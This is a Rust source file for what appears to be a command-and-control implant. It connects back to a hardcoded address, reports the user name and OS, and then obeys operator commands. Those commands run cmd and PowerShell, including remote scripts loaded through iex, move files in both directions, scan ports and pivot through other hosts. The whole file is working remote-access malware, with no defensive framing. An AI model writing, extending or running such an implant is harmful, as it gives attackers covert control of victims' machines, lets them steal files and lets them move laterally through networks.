use std::{thread, u8};
use std::error::Error;
use std::fs::File;
use std::io::{BufReader, Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::process::exit;
use std::sync::Mutex;
use std::time::Duration;
use std::collections::HashMap;
use async_port_scanner::Scanner;
use async_std::task;
use base64::{decode, encode};
use lazy_static::lazy_static;
use regex::Regex;


lazy_static! {
    static ref PIVOT_STREAM: Mutex<Option<TcpStream>> = Mutex::new(None);
}
pub struct ImportedScript {
    content: String,
    function_names: Vec<String>,
}
fn main() {
    let mut pivot_port: Option<u16> = None;
    let mut args = std::env::args();
    let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
    while let Some(arg) = args.next() {
        if arg == "-p" {
            if let Some(port_str) = args.next() {
                pivot_port = Some(port_str.parse().expect("Invalid port number"));
            } else {
                println!("Error: -p option requires a port number to be specified");
                exit(1);
            }
        }
    }

    if let Some(stream) = pivot_port {
        let listener = TcpListener::bind(format!("0.0.0.0:{}", stream)).expect("Error setting up listener");
        let (mut stream, _) = listener.accept().expect("Error accepting incoming connection");
        println!("New client connected");
        loop {
            let mut buffer = [0; 1024];
            let n = match stream.read(&mut buffer) {
                Ok(n) => n,
                Err(_) => break,
            };
            let mut command = String::from_utf8(buffer[..n].to_vec()).unwrap();
            command = command.replace("||PIVOTCMD|| ", "");
            println!("Received command from server: {}", command);
            if command.starts_with("||UPLOAD||") {
                handle_upload(&mut stream, &command);
            } else if command.starts_with("||DOWNLOAD||") {
                handle_download(&mut stream, &command);
            } else if command.starts_with("||CMDEXEC||") {
                handle_cmd(&mut stream, &command);
            } else if command.starts_with("||SCAN||") {
                handle_portscan(&mut stream, &command);
            } else if command.starts_with("||PIVOT||") {
                let stream_clone = stream.try_clone().expect("Error cloning stream");
                handle_pivot(stream_clone, &command);
            } else if command.starts_with("||EXIT||") {
                exit(1);
            } else {
                continue;
            }
        }
    } else {
        loop {
            match TcpStream::connect("192.168.136.1:8080") {
                Ok(mut stream) =>  {
                    println!("Successfully connected to the server");
                    let username = std::env::var("USERNAME").unwrap();
                    let os = std::env::var("OS").unwrap();
                    let outinfo = format!("||ACSINFO||{}||{}", username, os);
                    stream.write(outinfo.as_bytes()).unwrap();
                    loop {
                        let mut buffer = [0; 1024];
                        let n = match stream.read(&mut buffer) {
                            Ok(n) => n,
                            Err(_) => break,
                        };
                        let command = String::from_utf8(buffer[..n].to_vec()).unwrap();
                        let command_clone = command.clone();
                        println!("Received command from server: {}", command);
                        let mut stream_to_use = &mut stream;
                        let mut pivot_stream_option = PIVOT_STREAM.lock().unwrap();
                        if command.contains("||PIVOTCMD||") {
                            if let Some(pivot_stream) = pivot_stream_option.as_mut() {
                                stream_to_use = pivot_stream;
                                let mut modified_command = command.clone();
                                modified_command = modified_command.replace("||PIVOTCMD|| ", "");
                                stream_to_use.write(modified_command.as_bytes());
                            } else {
                                stream.write(b"Not using pivot");
                                continue;
                            }
                        }
                        if command_clone.starts_with("||UPLOAD||") {
                            handle_upload(stream_to_use, &command_clone);
                        } else if command_clone.starts_with("||DOWNLOAD||") {
                            handle_download(stream_to_use, &command_clone);
                        } else if command_clone.starts_with("||CMDEXEC||") {
                            handle_cmd(stream_to_use, &command_clone);
                        } else if command_clone.starts_with("||PSHEXEC||") {
                            handle_psh(stream_to_use, &command_clone);
                        } else if command_clone.starts_with("||SCAN||") {
                            handle_portscan(stream_to_use, &command_clone);
                        } else if command_clone.starts_with("||PIVOT||") {
                            let stream_clone = stream.try_clone().expect("Error cloning stream");
                            handle_pivot(stream_clone, &command_clone);
                        } else if command.starts_with("||IMPORTSCRIPT||") {
                            handle_import_psh(stream_to_use, &command_clone, &mut imported_scripts);
                        } else if command.starts_with("||RUNSCRIPT||") {
                            handle_run_script(&mut stream, &command, &imported_scripts);
                        }
                        else if command_clone.starts_with("||EXIT||") {
                            exit(1);
                        } else {
                            continue;
                        }
                    }
                }
                Err(_) => {
                    println!("Failed to connect to the server. Retrying in 5 seconds...");
                    thread::sleep(Duration::from_secs(5));
                }
            }
        }
    }
}

fn handle_import_psh(stream: &mut TcpStream, command: &str, imported_scripts: &mut HashMap<String, ImportedScript>) -> Result<(), Box<dyn Error>> {
    let mut buffer = [0; 1024];
    let mut encoded_data = String::new();

    stream.set_read_timeout(Some(Duration::from_secs(60)))?;

    loop {
        let n = stream.read(&mut buffer)?;
        let data = String::from_utf8(buffer[..n].to_vec())?;
        encoded_data.push_str(&data);
        if data.contains("|!!done!!|") {
            break;
        }
    }
    encoded_data = encoded_data.replace("\r", "").replace("\n", "").replace(" |!!done!!|", "");

    let decoded_data = decode(&encoded_data)?;
    let script_content = String::from_utf8(decoded_data)?;

    let mut function_names = Vec::new();
    let function_pattern = Regex::new(r"function\s+([\w-]+)\s*\{").unwrap();

    for cap in function_pattern.captures_iter(&script_content) {
        if let Some(name) = cap.get(1) {
            function_names.push(name.as_str().to_string());
        }
    }

    let imported_script = ImportedScript {
        content: script_content.clone(),
        function_names: function_names.clone(),
    };

    imported_scripts.insert(script_content, imported_script);

    for function_name in function_names {
        let success_msg = format!("Successfully imported {}\n", function_name);
        stream.write(success_msg.as_bytes())?;
    }
    stream.flush()?;

    Ok(())
}

fn handle_run_script(stream: &mut TcpStream, command: &str, imported_scripts: &HashMap<String, ImportedScript>, ) {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    let function_name = parts[1].trim();
    let additional_args = if parts.len() > 2 {
        parts[2].trim()
    } else {
        ""
    };
    let script_content = imported_scripts
        .values()
        .find(|script| script.function_names.contains(&function_name.to_string()))
        .map(|script| script.content.clone());

    if let Some(script_content) = script_content {
        let command = format!("iex '{}' ; {} {}", script_content, function_name, additional_args);
        println!("{}",command);
        let output = match std::process::Command::new("powershell")
            .arg("-Command")
            .arg(&command)
            .output() {
            Ok(output) => output,
            Err(e) => {
                let error_message = format!("Error executing PowerShell command: {}||cmd||", e);
                stream.write(error_message.as_bytes()).expect("Error writing to stream");
                stream.flush().expect("Error flushing stream");
                return;
            }
        };
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        stream.write(stdout.as_bytes()).map_err(|_| "Error writing to stream".to_string());
        stream.write(stderr.as_bytes()).map_err(|_| "Error writing to stream".to_string());
        stream.write(b"||cmd||");
        stream.flush().expect("Error flushing stream");
    } else {
        let mut available_functions = Vec::new();
        for script in imported_scripts.values() {
            for function_name in &script.function_names {
                available_functions.push(function_name);
            }
        }

        let available_functions_str = available_functions
            .iter()
            .map(|name| name.as_str())
            .collect::<Vec<&str>>()
            .join(", ");

        let error_message = format!(
            "Function not found in imported scripts.\r\nAvailable functions: \r\n  {}||cmd||",
            available_functions_str
        );

        stream.write(error_message.as_bytes()).expect("Error writing to stream");
        stream.flush().expect("Error flushing stream");
    }
}


fn handle_upload(stream: &mut TcpStream, command: &str) -> Result<(), Box<dyn Error>> {
    let parts: Vec<&str> = command.split(" ").collect();
    let destination = parts[1];
    let mut file = File::create(destination)?;
    stream.set_read_timeout(Some(Duration::from_secs(60)))?;
    let mut buffer = [0; 1024];
    let mut encoded_data = String::new();
    loop {
        let n = stream.read(&mut buffer)?;
        let data = String::from_utf8(buffer[..n].to_vec())?;
        encoded_data.push_str(&data);
        if data.contains("|!!done!!|") {
            break;
        }
    }
    encoded_data = encoded_data.replace("\r", "").replace("\n", "").replace(" |!!done!!|", "");
    let decoded_data = decode(&encoded_data)?;
    file.write_all(&decoded_data)?;
    let response_string = format!("UPLOAD: File saved to {}.", destination);
    stream.write(response_string.as_bytes())?;
    Ok(())
}

fn handle_download(stream: &mut TcpStream, command: &str) {
    let parts: Vec<&str> = command.split(" ").collect();
    let file_name = parts[1];
    let file = match File::open(file_name) {
        Ok(file) => file,
        Err(_) => {
            stream.write(b"File not found");
            return;
        }
    };
    let mut reader = BufReader::new(file);
    let mut buffer = Vec::new();
    reader.read_to_end(&mut buffer);
    let encodedfile = encode(&buffer);
    let encodedfile = encodedfile.trim();
    let encodedfile = encodedfile.replace("\r", "").replace("\n", "").replace(" ", "");
    stream.write(encodedfile.as_bytes());
    stream.write(b" |!!done!!|").unwrap();
    stream.flush().unwrap();
}



fn handle_cmd(stream: &mut TcpStream, command: &str) {
    let parts: Vec<&str> = command.splitn(2, "||CMDEXEC|| ").collect();
    let command = parts[1];
    println!("{}",command);
    let output = std::process::Command::new("cmd")
        .arg("/c")
        .arg(&command)
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    stream.write(stdout.as_bytes()).map_err(|_| "Error writing to stream".to_string());
    stream.write(stderr.as_bytes()).map_err(|_| "Error writing to stream".to_string());
    stream.write(b"||cmd||");
    stream.flush().expect("Error flushing stream");
}


fn handle_psh(stream: &mut TcpStream, command: &str) {
    let parts: Vec<&str> = command.splitn(2, "||PSHEXEC|| ").collect();
    let command = parts[1];
    println!("{}",command);
    let output = std::process::Command::new("powershell")
        .arg("-Command")
        .arg(&command)
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    stream.write(stdout.as_bytes()).map_err(|_| "Error writing to stream".to_string());
    stream.write(stderr.as_bytes()).map_err(|_| "Error writing to stream".to_string());
    stream.write(b"||cmd||");
    stream.flush().expect("Error flushing stream");
}


fn handle_portscan(stream: &mut TcpStream, command: &str) {
    let parts: Vec<&str> = command.split(" ").collect();
    let ip = parts[1];
    let num1_str = parts[2].trim();
    let num1 = match num1_str.parse() {
        Ok(num) => num,
        Err(err) => {
            let err = format!("Error parsing number: {}", err);
            stream.write(err.as_bytes());
            return;
        }
    };
    let num2_str = parts[3].trim();
    let num2 = match num2_str.parse() {
        Ok(num) => num,
        Err(err) => {
            let err = format!("Error parsing number: {}", err);
            stream.write(err.as_bytes());
            return;
        }
    };
    let ps = Scanner::new(Duration::from_secs(4));
    let ftr = ps.run(ip.to_string(), num1, num2);
    let my_addrs: Vec<SocketAddr> = task::block_on(async { ftr.await });
    let my_addrs_slice: &[u8] = &my_addrs
        .into_iter()
        .map(|addr| addr.to_string().as_bytes().to_owned())
        .collect::<Vec<Vec<u8>>>()
        .concat();
    stream.write(my_addrs_slice);
}

fn handle_pivot(mut stream: TcpStream, command: &str) -> Result<TcpStream, String> {
    let command = command.trim();
    let parts: Vec<&str> = command.split(" ").collect();
    let pivot_ip = parts[1];
    let pivot_port = match parts[2].parse::<i32>() {
        Ok(pivot_port) => pivot_port,
        Err(_) => {
            stream.write(b"Error: Invalid pivot port").unwrap();
            return Err("Error: Invalid pivot port".to_string());
        }
    };

    let connection = format!("{}:{:?}", pivot_ip, pivot_port);
    let pivot_stream = match TcpStream::connect(connection.clone()) {
        Ok(pivot_stream) => pivot_stream,
        Err(_) => {
            stream.write(b"Error connecting to pivot client").unwrap();
            return Err("Error connecting to pivot client".to_string());
        }
    };
    println!("{}", connection);
    stream.write(b"||CONNECTED||").unwrap();
    let mut pivot_stream_clone = pivot_stream.try_clone().unwrap();
    let pivot_clone = pivot_stream.try_clone().unwrap();
    thread::spawn(move || {
        *PIVOT_STREAM.lock().unwrap() = Some(pivot_stream.try_clone().unwrap());
        let mut buffer = [0; 1024];
        loop {
            match pivot_stream_clone.read(&mut buffer) {
                Ok(n) => {
                    let data = &buffer[..n];
                    stream.write_all(data).expect("Error writing to server stream");
                }
                Err(_) => break,
            }
            match stream.read(&mut buffer) {
                Ok(n) => {
                    let data = &buffer[..n];
                    pivot_stream_clone.write_all(data).expect("Error writing to pivot stream");
                }
                Err(_) => break,
            }
        }
    });
    Ok(pivot_clone)
}
